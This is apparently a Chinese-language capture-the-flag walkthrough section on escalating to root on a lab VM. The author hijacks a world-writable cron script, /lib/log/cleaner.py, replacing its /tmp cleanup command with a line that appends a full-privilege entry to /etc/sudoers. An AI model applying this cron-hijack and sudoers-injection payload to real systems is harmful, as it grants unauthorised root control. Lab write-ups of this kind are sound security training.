## 提权

### 定时任务

登录上去过后每隔一段时间就会断开连接

![](https://pic1.imgdb.cn/item/69aa760359f896a650d38454.png)

在 Cron 日志查看有没有定时任务

Cron 日志主要记录系统中定时任务的执行情况，包括：

- 每次任务执行的精确时间戳

- 执行任务的用户身份（如 root、www-data）

- 被执行的命令或脚本的完整路径

- 任务执行后的输出或错误信息（通常通过邮件或系统日志记录）

![](https://pic1.imgdb.cn/item/69aa773959f896a650d38a23.png)

去找这个文件

```bash
overflow@troll:/$ find / -name cleaner.py | grep "cleaner.py"
...
...
...
/lib/log/cleaner.py
```

看一下文件内容

```bash
overflow@troll:/$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

好消息是这个文件是所有人可写的

```bash
-rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
```

所以我们直接修改文件

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "overflow ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```

然后再次登录就能获取 Root 权限了

```bash
overflow@troll:/$ sudo su
sudo: unable to resolve host troll
root@troll:/# 
```
